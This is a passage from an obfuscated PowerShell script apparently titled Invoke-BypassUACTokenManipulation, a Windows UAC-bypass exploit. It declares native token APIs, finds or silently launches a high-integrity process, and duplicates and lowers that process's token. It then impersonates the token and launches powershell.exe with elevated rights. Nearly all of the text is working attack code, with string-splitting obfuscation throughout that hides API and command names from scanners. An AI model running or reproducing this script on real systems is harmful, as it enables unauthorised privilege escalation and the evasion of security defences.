    ("{0}{2}{1}"-f 'dwF','s','lag') = &("{1}{0}" -f'ld','fie') 11 ("{1}{0}"-f'nt','i')
    ("{1}{3}{0}{2}"-f 'i','wS','ndow','howW') = &("{1}{0}" -f'd','fiel') 12 ("{0}{1}"-f 'in','t')
    ("{2}{3}{1}{0}" -f 'd2','serve','c','bRe') = &("{0}{1}" -f'fi','eld') 13 ("{0}{1}"-f'in','t')
    ("{1}{2}{3}{0}"-f'2','l','p','Reserved') = &("{0}{1}" -f'fie','ld') 14 ("{0}{1}" -f 'IntPt','r')
    ("{0}{2}{1}" -f'hStdInp','t','u') = &("{1}{0}" -f 'ield','f') 15 ("{1}{0}{2}"-f'ntPt','I','r')
    ("{1}{0}{3}{2}" -f't','hS','put','dOut') = &("{1}{0}" -f 'ld','fie') 16 ("{0}{1}" -f 'IntPt','r')
    ("{0}{1}" -f'hStdErr','or') = &("{0}{1}" -f 'f','ield') 17 ("{0}{1}" -f'I','ntPtr')
}

${p`ROCEsS_iNF`oRmATi`on} = &("{0}{1}"-f'str','uct') ${mO`DU`lE} ("{4}{2}{0}{1}{3}" -f 'O','RMATI','INF','ON','PROCESS_') @{
     ("{0}{2}{1}" -f'h','s','Proces') = &("{0}{1}"-f 'fi','eld') 0 ("{2}{1}{0}"-f'r','Pt','Int')
     ("{1}{2}{0}"-f 'd','hThr','ea') = &("{1}{0}"-f 'ld','fie') 1 ("{1}{0}"-f'ntPtr','I')
     ("{1}{0}{2}"-f'Pro','dw','cessId') = &("{1}{0}" -f 'ield','f') 2 ("{1}{0}"-f't','in')
     ("{1}{2}{0}"-f'hreadId','d','wT') = &("{1}{0}" -f'd','fiel') 3 ("{0}{1}"-f'in','t')
}

${fu`Nc`TionD`EFIni`T`iONs} = @(
    (&("{1}{0}"-f 'unc','f') ("{2}{0}{1}"-f'api','32','adv') ("{2}{1}{3}{0}" -f 'ken','P','Open','rocessTo') ([bool]) @(
        [IntPtr],
        [UInt32],
          (  GET-VAriAbLe ("s"+"X39c"))."vAl`UE".("{2}{0}{3}{1}"-f 'keB','e','Ma','yRefTyp').Invoke()
    ) -EntryPoint ("{2}{1}{3}{0}"-f 'oken','pen','O','ProcessT') -SetLastError),

    (&("{0}{1}"-f'fun','c') ("{2}{0}{1}" -f 'dvapi3','2','a') ("{5}{4}{1}{3}{2}{0}" -f'n','T','matio','okenInfor','et','G') ([bool]) @(
        [IntPtr],
        [Int32],
        [IntPtr],
        [UInt32],
         $C8SRz.("{3}{1}{0}{2}" -f'RefTy','y','pe','MakeB').Invoke()
    ) -EntryPoint ("{0}{1}{4}{2}{3}{5}"-f'Ge','tT','nformat','io','okenI','n') -SetLastError),

    (&("{1}{0}"-f'nc','fu') ("{0}{1}" -f 'ad','vapi32') ("{3}{4}{1}{5}{2}{0}"-f 'rityCount','A','ho','GetSidSu','b','ut') ([IntPtr]) @(
        [IntPtr]
    ) -EntryPoint ("{1}{2}{3}{5}{4}{0}" -f'nt','GetSidSu','bA','ut','ou','horityC') -SetLastError),

    (&("{0}{1}" -f'fun','c') ("{1}{2}{0}" -f 'api32','a','dv') ("{5}{1}{2}{0}{4}{3}"-f 't','SubA','u','rity','ho','GetSid')([IntPtr]) @(
        [IntPtr],
        [UInt32]
    ) -EntryPoint ("{3}{2}{0}{1}{4}{5}"-f 'SubA','uth','id','GetS','o','rity') -SetLastError),

    (&("{0}{1}"-f'f','unc') ("{1}{0}" -f 'pi32','adva') ("{0}{2}{3}{1}{4}" -f 'Dupl','Tok','icat','e','enEx') ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32],
        [UInt32],
          (  ITeM ('VAr'+'Ia'+'blE:sx39'+'c')  )."v`AlUe".("{2}{1}{0}" -f'efType','akeByR','M').Invoke()
    ) -EntryPoint ("{3}{0}{2}{1}" -f 'u','TokenEx','plicate','D') -SetLastError),

    (&("{1}{0}"-f'unc','f') ("{1}{2}{0}" -f'2','adv','api3') ("{2}{3}{5}{6}{0}{1}{7}{4}"-f'tializ','e','Allocate','An','id','d','Ini','S') ([bool]) @(
        ${SiD_`IdEn`TIFIeR`_`AUt`hOR`ITy},
        [Byte],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
         $SX39C.("{4}{1}{0}{3}{2}" -f'y','eB','ype','RefT','Mak').Invoke()                  
    ) -EntryPoint ("{3}{0}{2}{4}{1}{5}" -f'l','ate','o','Al','c','AndInitializeSid') -SetLastError),

    (&("{0}{1}"-f'fu','nc') ("{1}{0}"-f'api32','adv') ("{0}{6}{3}{2}{4}{7}{1}{5}" -f 'Imp','On','a','rson','teL','User','e','ogged') ([bool]) @(
        [IntPtr]
    )-EntryPoint ("{5}{1}{3}{0}{2}{4}"-f 'nateLog','mp','gedOnU','erso','ser','I') -SetLastError),

    (&("{0}{1}" -f 'fun','c') ("{1}{2}{0}"-f'vapi32','a','d') ("{5}{4}{2}{3}{1}{0}" -f 'nW','go','cessW','ithLo','ePro','Creat') ([bool]) @(
        [String],
        [String],
        [String],
        [UInt32],
        [String],
        [String],
        [UInt32],
        [UInt32],
        [String],
        [IntPtr],
          ( vArIaBLe ("{0}{1}"-f 'SX39','c') )."VA`lUe".("{3}{2}{1}{0}{4}"-f'fT','e','ByR','Make','ype').Invoke()
    )-EntryPoint ("{5}{2}{1}{0}{4}{3}"-f 'ocessWithL','tePr','ea','nW','ogo','Cr') -SetLastError),


    (&("{0}{1}"-f'f','unc') ("{0}{1}{2}" -f 'kern','el','32') ("{3}{1}{0}{2}"-f'e','penProc','ss','O') ([IntPtr]) @(
        [UInt32],
        [bool],
        [UInt32]
    )-EntryPoint ("{3}{0}{1}{2}"-f 'r','oc','ess','OpenP') -SetLastError),

    (&("{0}{1}"-f 'fu','nc') ("{1}{0}"-f 'rnel32','ke') ("{3}{2}{1}{0}" -f 'cess','ro','minateP','Ter') ([bool]) @(
        [IntPtr],
        [UInt32]
    )-EntryPoint ("{2}{3}{1}{0}"-f'ess','oc','Term','inatePr') -SetLastError),

    (&("{1}{0}"-f 'c','fun') ("{1}{0}" -f 'dll','nt') ("{1}{0}{5}{3}{2}{4}" -f 'Se','Nt','f','In','ormationToken','t') ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32]
    )-EntryPoint ("{3}{4}{0}{5}{2}{1}" -f'SetInf','Token','mation','N','t','or') -SetLastError),

    (&("{0}{1}"-f'f','unc') ("{0}{1}" -f'ntd','ll') ("{3}{1}{0}{2}{4}" -f'k','lterTo','e','NtFi','n') ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [IntPtr],
        [IntPtr],
         $sx39c.("{1}{3}{4}{0}{2}" -f'yp','M','e','ake','ByRefT').Invoke()
    )-EntryPoint ("{0}{2}{1}{3}" -f 'Nt','ilterT','F','oken') -SetLastError)



)

${t`YPEs} = ${fu`Nction`deFiNit`ioNS} | &("{1}{0}{3}{2}" -f 'd-Win3','Ad','Type','2') -Module ${M`oDu`lE} -Namespace ("{0}{1}"-f 'W','in32')
${A`dvaPi`32} = ${TyP`es}[("{0}{2}{1}" -f 'adv','32','api')]
${k`er`NEL32} = ${ty`Pes}[("{0}{1}"-f 'kern','el32')]
${NtD`lL} = ${TyP`ES}[("{0}{1}"-f'n','tdll')]



function ENumPro`cES`SEs(){
    &("{1}{0}{2}"-f'ce','Get-Pro','ss') | &('%'){
        
        ${p`R`oc`HAndLe} = ${KERN`e`L32}::("{0}{1}{2}{3}" -f 'Ope','nProc','e','ss').Invoke(0x00001000, ${fA`lSe}, ${_}."ID")
        if(${prO`cH`A`Ndle} -eq 0){
            
            return
        }

        
        ${ht`OkENha`ND`le} = 0
        ${C`ALl`R`eSULT} = ${a`D`VapI32}::"o`pE`NprO`C`ESsTO`KeN"(${PRO`C`hand`LE}, 0x02000000, [ref]${H`TOkenH`ANdLE})
        if(${c`A`llREs`ULT} -eq 0){
            return
        }   
            
        
        [int]${LE`NG`Th} = 0
        ${c`AL`lResu`lT} = ${AD`V`Api32}::("{1}{0}{3}{2}" -f'enI','GetTok','on','nformati').Invoke(${HtO`Kenh`An`dLe}, 25,   (  diR  ("{0}{3}{4}{2}{1}" -f'VAr',':SX39C','e','iAB','L') )."V`AluE"::"ZE`RO", ${L`en`GtH}, [ref]${LEn`G`Th})
            
        
        [IntPtr]${toke`NINF`oRMa`TION} =   (vARIAbLe ('69S'+'Mo') -ValueON)::("{1}{3}{0}{2}"-f 'oba','A','l','llocHGl').Invoke(${LEN`g`Th})
        ${caLlr`e`sulT} = ${Ad`VAp`I32}::("{3}{1}{2}{4}{0}"-f 'ion','tTo','kenInfo','Ge','rmat').Invoke(${H`TOkEnHa`N`DlE}, 25, ${TOKe`Nin`ForMA`TiON}, ${L`en`GtH}, [ref]${L`ENg`Th})
            
        [System.IntPtr] ${p`S`iD1} =   (iteM  ('v'+'ARiABL'+'E:'+'6'+'9smO'))."Va`LUe"::("{2}{1}{0}"-f'tr','P','ReadInt').Invoke(${tO`K`ENinF`o`RM`ATION})
        [int]${IntE`GriTYLE`VEl} =  $69smo::("{0}{2}{1}"-f'Rea','32','dInt').Invoke(${a`Dv`ApI32}::("{0}{4}{1}{2}{5}{3}"-f 'GetSi','Sub','Auth','y','d','orit').Invoke(${p`SId1}, ( (  LS ("v"+"A"+"r"+"iablE:69sMo")  )."v`ALUe"::("{2}{1}{0}" -f'Byte','ad','Re').Invoke(${A`dV`API`32}::("{2}{3}{0}{4}{1}"-f'ty','ount','GetSidSub','Authori','C').Invoke(${pS`I`D1})) - 1)))
        if(${IN`TEg`RI`TylEv`El} -eq 12288){
            return [int]${_}."iD"
        }
    }
}

function EL`e`V`AtepRO`ceSs(${H`IPRoc},${b`INArY}, ${a`R`guMENtS}){
    ${PRoCes`S_Q`U`Er`y_`limItED_iNfOR`MAT`Ion} = 0x00001000
    ${bi`NHEriThAn`D`le} = ${FAl`SE}
    ${h`P`RoCEsS} = ${KE`RNE`l32}::("{2}{1}{3}{0}" -f's','nPro','Ope','ces').Invoke(${P`ROCEs`S`_qUery`_LiMITed`_`INFOrmATI`ON}, ${BINhE`Ri`T`HAN`dLe}, ${hiP`ROC}[0]) 
    if (${h`PRocess} -ne 0) {
            &("{3}{1}{2}{0}"-f 'rbose','te-','Ve','Wri') "[*] Successfully acquired $((Get-Process -Id $HIProc).Name) handle "
        } else {
            &("{2}{0}{1}"-f 'e','rbose','Write-V') ('[!]'+' '+'F'+'ailed'+' '+'t'+'o '+'g'+'et '+'pr'+'o'+'cess '+"token!`n")
            Break
        }
    ${hT`OKEN} =   (  DIr  ("VaRI"+"Abl"+"e"+":sX39c"))."vA`LUe"::"z`ERo"
    
    if(${adV`API`32}::"Ope`NP`RocEs`sToKEn"(${Hpr`o`cEsS}, 0x02000000, [ref]${HTok`En})) {
        &("{1}{2}{0}{3}" -f'-Verb','Wr','ite','ose') ("{4}{2}{0}{3}{5}{1}{6}" -f'ened','ss t','Op',' proc','[*] ','e','oken')
    } else {
        &("{0}{3}{1}{2}" -f'W','e','-Verbose','rit') ('[!]'+' '+'Fail'+'ed '+'o'+'pen '+'p'+'ro'+'cess '+"token!`n")
        Break
    }


    ${h`NEwT`OKEN} =   $sx39C::"ze`RO" 
    ${Se`C_atT`R`I`Butes_`s`TrUCt} =  ( vAriabLE ('1L'+'a5T'+'E')  )."V`ALuE"::("{0}{2}{1}"-f'Cre','eInstance','at').Invoke(${SEcU`Ri`T`y_a`TTrIBUTes})
    [IntPtr]${Se`C_atTrI`Bu`TEs_P`Tr} =   (VArIaBle ("{0}{1}"-f'69sM','O'))."V`Alue"::("{1}{2}{0}" -f'bal','A','llocHGlo').Invoke(${secUri`T`y_attRiBU`T`Es}::("{1}{0}" -f'tSize','Ge').Invoke())
      $HEt::("{0}{2}{1}" -f'St','tureToPtr','ruc').Invoke(${sE`c`_`AT`TrI`BUTes_S`Truct}, ${S`e`C_aTTRi`B`UTe`S_PTr},${fAl`Se})
    if(${adVap`I32}::("{0}{3}{2}{1}" -f 'D','nEx','oke','uplicateT').Invoke(${H`To`keN},0xf01ff,${seC`_at`TrIBU`Te`s_PtR},2,1,[ref]${hn`eWT`okeN})) {
        &("{0}{2}{3}{1}" -f 'Wr','bose','it','e-Ver') ("{1}{4}{6}{7}{5}{2}{0}{3}" -f 'ess to','[*]','oc','ken',' D','ted pr','upl','ica')
    } else {
        &("{3}{0}{4}{2}{1}" -f 'r','ose','Verb','W','ite-') ('[!]'+' '+'Fa'+'iled '+'to'+' '+'d'+'up'+'licate '+'pro'+'cess '+"token!`n")
        Break
    }
    ${SI`A_`sTRUCt} =  (GeT-vAriABLE ("{0}{1}" -f '1lA','5TE')  -vaLuEoNLY )::("{1}{2}{3}{0}"-f 'stance','Cre','ate','In').Invoke(${Sid_i`DEn`TIfIeR`_A`UTHOrITy})
    
    ${sIA_`Str`U`cT}."v`AlUE" = [byte[]](0x0, 0x0, 0x0, 0x0, 0x0, 0x10)

    [IntPtr]${sIA_`Ptr} =  $69sMO::("{2}{0}{1}{3}"-f'llo','cHGloba','A','l').Invoke(${sID`_IDEn`T`ifi`e`R_AuTH`orITy}::("{1}{0}{2}" -f 'S','Get','ize').Invoke())
     (chILDITEM ("{2}{1}{0}"-f 'eT','h','VARiablE:'))."v`ALUe"::("{0}{4}{3}{1}{2}" -f'S','Pt','r','To','tructure').Invoke(${sia`_`st`RucT},${SI`A_pTr},${fal`sE})
    ${p`siD} =  (get-CHiLDITem  ("{1}{0}{3}{2}" -f'IaBle','vAR','M6E',':3') )."vAL`Ue"::"z`eRo"

    ${Ad`VApi`32}::"al`lOcATEaNdINiT`I`AlIz`Esid"(${sIa`_p`Tr},1,0x2000,0,0,0,0,0,0,0,[ref]${P`siD})



    ${si`D_aND_a`TtrIBu`TE`S`_s`T`RUCt} =  ( gET-VaRiaBle ("{1}{2}{0}" -f 'e','1lA','5T')  )."V`AlUE"::("{1}{4}{0}{2}{3}"-f 'ta','Crea','n','ce','teIns').Invoke(${S`id_an`d_ATTRibut`Es})
    ${s`I`D_aND_ATtributes_`sT`RuCt}."S`Id" = ${p`SId}
    ${sID`_And_aT`TrI`ButES_`S`T`RUct}."At`TrIBUT`ES" = 0x20
    [IntPtr]${S`id_aNd_ATTriBu`T`es`_PtR} =   (gEt-VaRIablE ("6"+"9smo")  )."va`Lue"::("{1}{0}{3}{2}"-f 'G','AllocH','obal','l').Invoke(${SiD_AN`D_atTRIb`U`TeS}::("{0}{1}"-f 'G','etSize').Invoke())
      (GEt-VaRIABle ("{1}{0}"-f't','He')  )."VA`lUE"::("{0}{1}{3}{4}{2}" -f'St','r','ureToPtr','u','ct').Invoke(${sId`_a`N`d`_A`TtrIbU`Tes_sT`RUcT}, ${sI`D_And_atT`Rib`UTES_`pTR},${f`AlSE})
    ${TOK`E`N_maNdat`orY_`L`A`BEL`_`STRUct} =   ( get-VarIaBle ("1la5"+"T"+"E")  -valUEoNl)::("{1}{0}{2}{4}{3}"-f'teInsta','Crea','n','e','c').Invoke(${TO`ken_Ma`NdAt`orY_`LABel})
    ${ToK`En_`m`A`NdaT`ORy_lABeL_STRUCT}."L`AbEl" = ${s`ID_AnD_`AtTRi`BUT`E`S_stRuCt}
    [IntPtr]${TOk`EN_`MANDATOr`Y_`LABEl_PTR} =   $69SmO::("{2}{1}{0}"-f'l','oba','AllocHGl').Invoke(${toKe`N_MAN`Da`TOr`y_`L`AbeL}::("{2}{1}{0}" -f'e','iz','GetS').Invoke())
      $hEt::("{1}{2}{3}{0}" -f 'tr','Str','uctur','eToP').Invoke(${t`o`kEn_Ma`NDatoRY_L`ABe`l`_s`T`RUCt}, ${tok`EN_`M`ANDAToR`Y_LABe`L`_P`TR},${F`AlsE})
    ${toKeN_`mA`NdAtORY`_laB`El_Si`ze} =   $69Smo::("{2}{0}{1}" -f'eO','f','Siz').Invoke(${T`OK`En`_Ma`NDa`TORY_`laB`El_StRucT})

    if(${N`TdlL}::("{3}{6}{5}{4}{2}{0}{1}" -f'To','ken','n','NtSetInfo','tio','a','rm').Invoke(${HNe`w`TOk`En},25,${T`oKE`N_`mandat`oRY_L`AbEl_PTR},$(${T`OKEN`_mAnDatOR`Y_LAbel_`S`izE})) -eq 0) {
        &("{1}{0}{2}{3}" -f'erb','Write-V','os','e') ("{1}{8}{2}{5}{6}{3}{7}{0}{4}"-f 'o','[','re','ken m','ry IL','d',' to','andat','*] Lowe')
    } else {
        &("{2}{0}{1}"-f'V','erbose','Write-') ('['+'!] '+'F'+'ailed'+' '+'modi'+'f'+'y '+"token!`n")
        Break
    }
    [IntPtr]${luA`To`KEn} =   $3M6E::"ZE`Ro"
    if(${nT`d`LL}::("{0}{2}{1}" -f 'Nt','lterToken','Fi').Invoke(${hNewT`oK`EN},4, ( VArIaBLe  ("{1}{0}" -f'x39c','S')  -VAluEoN  )::"ze`RO",  (VariAble ("{0}{1}" -f 'S','x39c')  -valu)::"z`ERo",  (  vARiabLE ('SX'+'39C')  -VAlUeOnly)::"zE`Ro",[ref]${luA`ToK`EN}) -eq 0) {
        &("{3}{2}{1}{0}"-f'e','te-Verbos','ri','W') ("{6}{5}{3}{7}{0}{2}{1}{4}{8}" -f 'ricte','t','d ','Crea','o','] ','[*','ted rest','ken')
    } else {
        &("{2}{1}{0}"-f'rbose','rite-Ve','W') ('[!'+'] '+'Fa'+'iled '+'to'+' '+'crea'+'t'+'e '+'restr'+'icted'+' '+"token!`n")
        Break
    }
    [IntPtr]${Hn`eW`TOKEN} =  ( ChiLDiTEm ('va'+'rI'+'AbLE:3M6e') )."v`ALuE"::"ZE`Ro"
    ${nEw_SeC`URIty_a`TT`RiBuTES`_`StRUCt} =   (cHILdiTEm  ("{3}{1}{0}{2}" -f 'e','RiABL',':1la5TE','Va') )."V`ALuE"::("{1}{0}{3}{4}{2}" -f'teIn','Crea','ce','sta','n').Invoke(${SEC`Ur`i`Ty_a`TTriBUTes})
    [IntPtr]${N`EW_SEcU`Rity`_`A`TtRibUt`es`_PTR} =  (  vAriABlE ("{1}{0}"-f 'MO','69s')  )."va`Lue"::("{3}{2}{0}{1}"-f'Glob','al','cH','Allo').Invoke(${sECUr`ITy_a`Ttr`i`BUTeS}::("{1}{0}"-f 'Size','Get').Invoke())
      (  gi  ("{1}{2}{0}"-f'HEt','vARiAblE',':')  )."val`UE"::("{1}{0}{2}"-f'To','Structure','Ptr').Invoke(${Ne`W_`SECuRIt`Y_aTTRIb`U`Tes_sTRucT}, ${n`Ew`_S`ecur`ItY_aTTRIb`U`T`ES_PtR},${f`Al`SE})
    if(${aD`V`ApI`32}::("{2}{1}{4}{0}{3}"-f 'en','plicateTo','Du','Ex','k').Invoke(${Luat`o`kEN},0xc,${nEw_sECUR`i`TY_`AtTrIB`UTES_`P`Tr},2,2,[ref]${hNe`WT`O`kEn})){
        &("{1}{2}{0}"-f'bose','Writ','e-Ver') ("{4}{5}{2}{0}{1}{3}" -f 'e','d restricte','at','d token','[*] Dupli','c')
    } else {
        &("{3}{2}{4}{0}{1}"-f'e','rbose','ite','Wr','-V') ('[!]'+' '+'F'+'ail'+'ed '+'t'+'o '+'d'+'up'+'licate '+'restri'+'cte'+'d '+"token!`n")
        Break
    }
    if(${adVa`P`I`32}::("{0}{2}{5}{4}{3}{1}" -f'ImpersonateL','ser','og','dOnU','e','g').Invoke(${Hn`EW`TO`KeN})){
        &("{0}{2}{1}{3}" -f 'Wr','e-Verb','it','ose') ("{0}{11}{3}{9}{6}{7}{2}{4}{12}{5}{8}{1}{10}" -f '[*]','cont','sec','cce','u','ity','t','ed ',' ','ssfully impersona','ext',' Su','r')
    } else {
        &("{4}{3}{1}{2}{0}"-f'se','Ve','rbo','te-','Wri') ('[!]'+' '+'Fa'+'iled '+'im'+'person'+'a'+'te '+"context!`n")
        Break
    }

    ${ST`AR`Tup`_`IN`FO`_strUct} =  (  GEt-varIABLe ("{0}{1}"-f '1','LA5tE'))."VA`LuE"::("{0}{4}{1}{3}{2}"-f'C','tan','e','c','reateIns').Invoke(${sT`ArtuP`in`FO})
    ${StAR`Tup`_i`NFO_`St`RUCt}."D`wf`lAGS" = 0x00000001 
    ${staRTup_i`N`Fo_St`RU`Ct}."Ws`hoW`wind`Ow" = 0x0001
    ${s`T`A`RtUP_INfo_S`Tr`UCt}."C`B" =   (vaRIABlE ("{0}{1}"-f'69','sMO') -vALUEo )::("{1}{0}"-f'eOf','Siz').Invoke(${StaRTuP`_`InfO`_Str`UCt})
    [IntPtr]${sTaRt`UP_i`NfO`_ptR} =  $69sMO::("{2}{0}{1}"-f 'll','ocHGlobal','A').Invoke(${S`Ta`RtUPInFo}::("{2}{1}{0}" -f 'ize','tS','Ge').Invoke())
     $HEt::("{3}{2}{1}{0}" -f'reToPtr','u','truct','S').Invoke(${S`T`A`RtUp`_I`NfO_sTRUCT},${StAr`TU`p_IN`Fo`_`PTr},${f`Al`SE})
    ${p`ROCESs_`InFoRmATi`oN_`s`TrU`cT} =  ( GEt-vARIablE ("1La5"+"Te") -VAlUEONly  )::("{3}{1}{0}{2}"-f 'c','eateInstan','e','Cr').Invoke(${proCEsS_`I`N`F`Or`mATi`oN})
    [IntPtr]${pROCEss_iNfOR`M`Ati`oN_P`Tr} =   (  GEt-vaRIAblE  ("{0}{1}"-f '6','9SMO') )."VA`LuE"::("{2}{0}{1}" -f'l','locHGlobal','A').Invoke(${Proc`eSs_`iNF`O`RM`ATI`on}::("{0}{1}" -f'GetSi','ze').Invoke())
     (gcI ("{0}{1}{3}{2}" -f'V','aRIAbLE','t',':he')  )."VaL`Ue"::("{1}{2}{0}"-f'tr','Str','uctureToP').Invoke(${pR`OCeS`S_INfo`R`mAt`I`O`N_Stru`ct},${PRocESS`_inForm`At`ION`_`P`TR},${fAl`Se})
    ${p`AtH} = ${enV`:`s`Ys`TEMroOt}
    ${a`d`VAp`I32}::("{3}{5}{0}{1}{4}{2}" -f'roc','ess','thLogonW','Cr','Wi','eateP').Invoke("l","o","l",0x00000002,((("{13}{11}{2}{14}{8}{9}{7}{0}{6}{10}{3}{4}{5}{15}{1}{12}" -f'rSh','l.ex','d','1.04','skpowe','rsh','ell4','we','em324skWin','dowsPo','skv','skWin','e','C:4','ows4skSyst','el'))-crEPLaCE '4sk',[cHAr]92),("{1}{0}{3}{2}"-f 'wers','po','.exe','hell')+ " " + ${aRgu`meN`Ts},0x04000000,${n`Ull},${p`Ath},${StA`Rt`UP_In`FO_PTR},[ref]${Pro`c`eSS_i`NFORMAtiOn_p`Tr})


}

function Inv`OKE-BYPAssuActO`keNM`AN`i`PUL`ATIOn {

param(
        [Parameter(MAnDaTOrY = ${Fa`L`SE})]
        [String]${bI`Na`Ry},
        [Parameter(maNdatoRy = ${fA`lSE})]
        [String]${ar`Gu`meN`TS},
        [Parameter(mANDAtorY = ${FAl`se})]
        [int]${pR`OCID}
    )


    if(!${pr`OCId}){
        ${VeR`B`osEPrEf`erEncE} = ("{2}{1}{0}"-f'e','ontinu','c')
        &("{1}{3}{0}{2}" -f 'e-Ve','Wr','rbose','it') ("{1}{0}{5}{2}{4}{3}{6}"-f 'erat','Enum',' Pro','ess ','c','ing','list...')
        ${h`I`PrOC} = @(&("{2}{0}{1}"-f 'rocesse','s','EnumP'))
        if(${HI`ProC}."co`UNT" -eq 0){
            &("{2}{0}{3}{1}" -f'Verb','e','Write-','os') ("{6}{5}{4}{1}{0}{3}{2}" -f 'le, startin','ab','.','g one..','avail','o HI process ','N')
            ${sT`A`RtINfo} = &("{0}{1}{2}" -f'New','-Objec','t') ("{3}{7}{6}{0}{5}{2}{4}{1}" -f 'ss','o','ar','Diagnostic','tInf','St','Proce','s.')
            ${stAR`Tin`Fo}."fil`eN`AmE" = ("{1}{2}{0}" -f 'e','Ta','skMgr.ex')
            ${s`TAr`Tinfo}."USE`sH`ELl`EXEcuTE" = ${T`RUe}
            ${s`TArT`inFO}."V`ERB" = ("{0}{1}" -f'r','unas')
            ${S`TA`Rt`inFo}."W`INdows`TyLE" = ("{1}{0}" -f 'idden','H')
            ${s`TARTi`Nfo}."CREa`T`e`NowI`NDOW" = ${tR`Ue}
            ${P`ROCeSS} = &("{2}{0}{1}"-f'-Obj','ect','New') ("{2}{3}{1}{4}{0}" -f 's','st','D','iagno','ics.Proces')
            ${pRO`CeSs}."ST`A`RTinfO" = ${STa`RT`i`NFo}
            ${NU`lL} = ${P`RO`cesS}.("{0}{1}"-f 'St','art').Invoke()
            &("{1}{3}{0}{2}"-f 'Verbo','Wri','se','te-') ("{5}{6}{8}{1}{2}{4}{7}{0}{3}" -f 'i','Process li','s','n...','t','Enumera','ti',' aga','ng ')
            ${h`I`PRoC} = &("{0}{1}{3}{2}"-f 'Enu','mPro','esses','c')
            &("{2}{1}{0}{3}" -f'r','te-Ve','Wri','bose') ('HI'+' '+'Pro'+'ces'+'s '+'f'+'ound. '+'P'+'ID: '+"$HIProc")
            &("{1}{0}{2}{3}{4}"-f'rite-','W','Verb','os','e') ('Dup'+'lica'+'t'+'ingT'+'oken '+'fro'+'m '+"$HIProc")
            &("{0}{2}{1}" -f'Write-V','ose','erb') ${bi`N`ArY}
            ${N`ULL} = &("{2}{1}{3}{4}{0}" -f 's','le','E','v','ateProces') ${H`iP`Roc} ${bI`NARy} ${ar`g`UMEN`Ts}
            &("{0}{2}{1}{3}{4}"-f 'Wri','e-','t','Ver','bose') ("{0}{4}{5}{6}{1}{2}{3}"-f 'Sl','s.','.','.','eep','ing 5 se','cond')
            &("{0}{2}{1}" -f'S','eep','tart-sl') 5
            &("{3}{0}{2}{1}"-f 'te-','ose','Verb','Wri') ("{1}{2}{5}{4}{7}{3}{9}{8}{6}{0}" -f'ss','K','illi','crea','n','ng the ','oce','ewly ','ed pr','t')
            ${n`ULl} = ${kERnE`l`32}::("{3}{1}{0}{2}" -f'tePr','mina','ocess','Ter').Invoke(${prO`C`EsS}."HAN`dle",1)
        }else{
            &("{3}{2}{0}{1}" -f'Verbo','se','rite-','W') ('HI'+' '+'Pro'+'c '+'foun'+'d'+'. '+'I'+'D: '+"$HIProc")
            &("{2}{1}{3}{0}"-f 'ocess','vateP','Ele','r') ${hIP`RoC} ${b`inaRy} ${A`RG`Um`EntS}
        }
    }else{
        &("{2}{3}{1}{0}" -f'e','rbos','Writ','e-Ve') ('E'+'lev'+'at'+'ing '+"$ProcID")
        &("{3}{1}{2}{0}" -f's','evatePro','ces','El') ${P`Rocid} ${bI`NArY} ${a`RgUmE`NtS}
    }
    
    
}